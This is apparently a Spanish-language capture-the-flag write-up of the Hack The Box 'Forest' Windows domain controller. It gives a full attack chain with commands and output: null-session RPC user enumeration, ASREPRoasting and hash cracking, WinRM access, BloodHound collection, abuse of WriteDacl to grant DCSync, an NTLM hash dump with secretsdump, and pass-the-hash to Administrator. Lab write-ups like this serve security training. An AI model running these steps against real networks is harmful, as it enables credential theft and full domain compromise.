---
layout: single
title: Forest HTB - WriteUp
excerpt: WriteUp de la máquina Forest de HTB.
date: 2023-02-20
classes: wide
header:
  teaser: /assets/images/Forest/Forest.png
  teaser_home_page: true
  icon: /assets/images/Forest/Forest.png
categories:
  - infosec
tags:
  - ctf
  - Windows                                                                                                                                                                                 
  - Writeup
  - RPC-Enum                                                                                                                                                                                  
  - Null-Session                                                                                                                                                                                    
  - ASREPRoast
  - Account Operators
  - WriteDacl
---



En el día de hoy estaremos resolviendo la máquina Forest de HTB.

### Enumeración Inicial.

Lo primero que haré será escanear los puertos de la máquina en busqueda de servicios expuestos. Para esta tarea usaremos la herramienta nmap como de costumbre.

```bash
❯ nmap -sC -sV -Pn -oN Extraction -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49928  10.10.10.161                    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.                                                                                              
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-21 18:20 CET                                                                                                                              
Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                                                                   
NSE Timing: About 99.78% done; ETC: 18:21 (0:00:00 remaining)                                                                                                                                
Nmap scan report for 10.10.10.161                                                                                                                                                            
Host is up (0.11s latency).                                                                                                                                                                  
                                                                 
PORT      STATE SERVICE      VERSION                                                                                                                                                         
53/tcp    open  domain       Simple DNS Plus                                                                                                                                                 
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-21 17:27:26Z)                                                                                                  
135/tcp   open  msrpc        Microsoft Windows RPC                                                                                                                                           
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                                                                   
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)                                                                      
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)                                                                                                
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  msrpc        Microsoft Windows RPC
49677/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49928/tcp open  msrpc        Microsoft Windows RPC
```

Podemos ver varias cosas interesantes en este escaneo:

- Se esta usando aparentemente un Windows Server 2016 Standard
- El dominio es htb.local, lo meteré en el /etc/hosts
-  Tiene expuesto: El DNS, Kerberos, LDAP, RPC, SMB y WINRM

Lo primero que intentaré enumerar será el SMB en busqueda de directorios compartidos sin necesidad de claves, usando null sessions.

```bash
❯ smbclient -L '\\10.10.10.161' -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
```

No hay nada... Lo siguiente será ver si puedo hacer consultas al RPC y enumerar objetos del dominio.

```bash
❯ rpcclient 10.10.10.161 -U '' -N
rpcclient $> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[abc] rid:[0x2581]
rpcclient $> 
```

He conseguido listar todos los usuarios del dominio a traves de RPC, debido a que permitia sesiones nulas. Bien, teniendo una lista de usuarios y el Kerberos abierto podemos intentar un ASREPRoast. 

> El ataque ASREPRoast busca usuarios sin necesidad de autenticación previa de Kerberos. Eso significa que cualquiera puede enviar una solicitud AS_REQ al KDC en nombre de cualquiera de esos usuarios y recibir un mensaje AS_REP. Este último tipo de mensaje contiene una parte de los datos cifrados con la clave de usuario original, derivados de su contraseña.

Para este ataque vamos a usar impacket, impacket incorpora un montón de herramientas y entre ellas GetNPUsers.py que permite hacer este tipo de ataques.

```bash
❯ cat users | cut -d '[' -f2 | cut -d ']' -f1 > users.txt

Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
abc
```

### Explotacíon Kerberos

Tenemos la lista de usuarios adaptada para la herramienta. Ahora podemos ejecutar el ataque de la siguiente forma.

```bash
❯ impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:05dd81de1919a2145271f1d6eeed3c0a$7bf34c7c8421a2421cd2c74c61ca49f421549a3e44fc6ff21f5a78305243d8cb1d8ec57d106ca3248bb23f75963cc112dd1e36c29ace1a3e22316ddf5c4f2c6e003b0adc33ec30e843f4e2dfc0ff40907c151a61717a1f615a4a3ae3808af886cf4c807ad636d28aa92220ad7a30973c1ac77f53d9e581a276c5c1ad69fe6011b34738d48ad3ec793977e39587e3ea1ca49ab2408ec40ee6381e5c2928d88d76b5854c6498ab33ce956e096c0815615b9a2f39a17f8071803ad0eb1d81ea371587dee5bcca453eaec05b4c8c061e857b0df1a814a066f38d95089966eeac909800fff30da945
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abc doesn't have UF_DONT_REQUIRE_PREAUTH set
```

El usuario svc-alfresco no requiere de autenticación y hemos podido extraer el AS_REP. Vamos a probar romperlo con hashcat o john.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:03 DONE (2023-02-21 18:40) 0.3039g/s 1241Kp/s 1241Kc/s 1241KC/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

La contraseña es "s3rvice" vamos a ver si es valida para autenticarnos con winrm.

```bash
❯ crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
WINRM       10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

### Enumeración del Sistema

¡Podemos autenticarnos! Usare evil-winrm para tener una "PowerShell".

```powershell
❯ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
Evil-WinRM shell v2.4
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Para enumerar el dominio en busqueda de escalar privilegios usaré BloodHound, lo primero que haremos será subir el script de powershell "SharpHound.ps1" que recopilará información sobre el dominio y lo exportará a un archivo zip, posteriormente este .zip se lo pasaramos a BloodHoundAD para que nos monte un gráfico.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.ps1
```

Importamos el modulo y llamamos a la función Invoke-BloodHound que empiece a recolectar información.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectAll
```

Se nos creará un .zip que nos descargaremos a nuestra máquina.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20230221101940_BloodHound.zip
Info: Downloading C:\Users\svc-alfresco\Documents\20230221101940_BloodHound.zip to 20230221101940_BloodHound.zip
```

Si importamos los datos a BloodHound y le decimos que queremos la ruta mas corta para convertirnos en Administrador del dominio nos muestra lo siguiente:

![](/assets/images/Forest/image1.png)

Nuestro usuario pertenece al grupo de Account Operators, lo que significa que podemos crear cuentas de usuario. Los miembros de este grupo pueden crear y modificar la mayoría de los tipos de cuentas, usuarios, grupos locales y grupos globales, ademas los miembros pueden iniciar sesión localmente en los controladores de dominio.

Los miembros del grupo Account Operators no pueden administrar la cuenta de usuario Administrador :(

Si miramos mas en detalle el grafico podemos darnos cuenta que para escalar privilegios tenemos que formar parte de 'EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL' para poder usar **WriteDacl**

### Explotacíon del Sistema.

Lo que voy a hacer será crear un usuario y añadirlo al grupo.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user bly bly@123 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add bly
The command completed successfully.
```

Para aprovecharnos de "WriteDacl" podemos usar la herrmaienta PowerView, https://github.com/PowerShellMafia/PowerSploit.git

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload PowerView.ps1
```

Importamos el script

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\PowerView.ps1
```

Vamos a crear los objetos necesarios para la explotación.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'bly@123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential ('HTB\bly', $pass)
```

Ahora ejecutaremos el siguiente comando para ganar permisos de DCSync

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity bly -Rights DCSync
```

Ahoa podemos usar SecretsDump para dumpear los hash NTLM y poder hacer PassTheHash para autenticarnos como administradores del dominio.

```bash
❯ secretsdump.py "htb.local/bly:bly@123@10.10.10.161" -dc-ip 10.10.10.161                                                                                                                    
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                                                                                                                     
                                                                                                                                                                                             
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                           
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                         
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::                                                                                             
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                               
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                                                                                              
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                      
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::                                                                                     
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::                                                                                     
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::                                                                                     
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::                                                                                     
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::                                                                                     
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::                                                                                     
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::                                                                                     
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::                                                                                     
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::                                                                                     
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::                                                                                     
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::                                                                                     
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::                                                                                                
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::                                                                                                  
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::                                                                                             
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::                                                                                                     
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::                                                                                                     
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::                                                                                                    
abc:9601:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::                                                                                                                
bly:9602:aad3b435b51404eeaad3b435b51404ee:41a61dea6443de256d2c6e6b66bdbb1a:::                                                                                                                
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:a6388c06ba76bf051b66a3b052fb1d8c:::                                                                                                            
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::   
```

Usaremos Evil-Winrm para hacer PassTheHash y conectarnos.

```powershell
❯ evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6' 
Evil-WinRM shell v2.4
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Ya hemos pwneado la máquina, espero que te sirva!




